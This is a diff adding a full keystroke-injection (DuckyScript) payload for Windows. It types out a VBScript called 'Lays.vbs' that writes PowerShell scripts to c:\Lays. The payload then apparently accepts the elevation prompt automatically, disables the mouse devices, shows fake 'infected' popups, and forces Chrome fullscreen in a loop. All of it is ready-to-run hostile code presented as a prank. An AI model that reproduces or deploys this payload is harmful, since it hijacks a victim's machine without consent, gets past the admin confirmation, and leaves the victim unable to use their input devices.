@@ -1,0 +1,120 @@
+DELAY 2000
+ESC
+DELAY 500
+GUI r
+DELAY 500
+STRING cmd
+ENTER
+DELAY 1000
+STRING cd %USERPROFILE%\Downloads
+ENTER
+STRING copy con Lays.vbs
+ENTER 
+DELAY 500
+STRING DisabledMouse = false
+ENTER
+STRING Set objShell = CreateObject("WScript.Shell")
+ENTER 
+STRING Set objWMIService = GetObject("winmgmts:\\" & "." & "\root\cimv2")
+ENTER
+STRING Set objFSO = CreateObject("Scripting.FileSystemObject")
+ENTER 
+STRING If Not objFSO.FolderExists("c:\Lays") Then
+ENTER
+STRING objFSO.CreateFolder("c:\Lays")
+ENTER 
+STRING End If
+ENTER
+STRING Set PrivEscalationScript = objFSO.CreateTextFile("c:\Lays\PrivEscalation.ps1",True)
+ENTER 
+STRING PrivEscalationScript.WriteLine "Start-Process powershell.exe c:\Lays\DisableMouse.ps1 -verb runas -WindowStyle Hidden"
+ENTER
+STRING PrivEscalationScript.Close
+ENTER 
+STRING Set DisableMouseScript = objFSO.CreateTextFile("c:\Lays\DisableMouse.ps1",True)
+ENTER
+STRING DisableMouseScript.WriteLine "while ($true){"
+ENTER 
+STRING DisableMouseScript.WriteLine "Start-Sleep -Seconds 2"
+ENTER
+STRING DisableMouseScript.WriteLine "$result = Test-Path 'C:\Lays\ChromeClosedFlag'"
+ENTER 
+STRING DisableMouseScript.WriteLine "If ($result -eq $True){"
+ENTER
+STRING DisableMouseScript.WriteLine "Get-PnpDevice -Class 'Mouse' -PresentOnly | Disable-PnpDevice -Confirm:$false"
+ENTER 
+STRING DisableMouseScript.WriteLine "break"
+ENTER
+STRING DisableMouseScript.WriteLine "}"
+ENTER 
+STRING DisableMouseScript.WriteLine "}"
+ENTER
+STRING DisableMouseScript.Close
+ENTER 
+STRING objShell.run "powershell.exe c:\Lays\PrivEscalation.ps1"
+ENTER
+STRING WScript.Sleep 3000
+ENTER 
+STRING objShell.Popup "Your computer has been infected with Lays.exe", 3, "Lays.exe", 64 + 4096
+ENTER
+STRING objShell.Popup "Lays will now forever be burned into your TV/Monitor", 3, "Lays.exe", 64 + 4096
+ENTER 
+STRING objShell.Popup "Just sit back and let it happen", 3, "Lays.exe", 48 + 4096
+ENTER
+STRING objShell.run "chrome.exe https://www.google.com/search?q=lays&udm=2 --start-fullscreen"
+ENTER 
+STRING do
+ENTER
+STRING WScript.Sleep 5000
+ENTER 
+STRING sQuery = "SELECT * FROM Win32_Process"
+ENTER
+STRING Set objItems = objWMIService.ExecQuery(sQuery)
+ENTER 
+STRING ChromeOpen = false
+ENTER
+STRING For Each objItem In objItems
+ENTER 
+STRING If objItem.Name = "chrome.exe" Then
+ENTER
+STRING ChromeOpen = true
+ENTER 
+STRING Exit For
+ENTER
+STRING End If
+ENTER 
+STRING Next
+ENTER
+STRING If ChromeOpen = false Then
+ENTER 
+STRING objShell.Popup "I told you to just LET IT HAPPEN!", 3, "Lays.exe", 16 + 4096
+ENTER
+STRING If DisabledMouse = false Then
+ENTER 
+STRING DisabledMouse = True
+ENTER
+STRING If Not objFSO.FolderExists("c:\Lays\ChromeClosedFlag") Then
+ENTER 
+STRING objFSO.CreateFolder("c:\Lays\ChromeClosedFlag")
+ENTER
+STRING End If
+ENTER 
+STRING WScript.Sleep 2000
+ENTER
+STRING objShell.Popup "Because you can't be trusted, I've went ahead and disabled your mouse!", 5, "Lays.exe", 64 + 4096
+ENTER 
+STRING End If
+ENTER
+STRING objShell.run "chrome.exe https://www.google.com/search?q=lays&udm=2 --start-fullscreen"
+ENTER 
+STRING End If
+ENTER
+STRING Loop
+ENTER 
+CTRL z
+DELAY 1000
+ENTER
+STRING start Lays.vbs && exit
+ENTER
+DELAY 3000
+ALT y
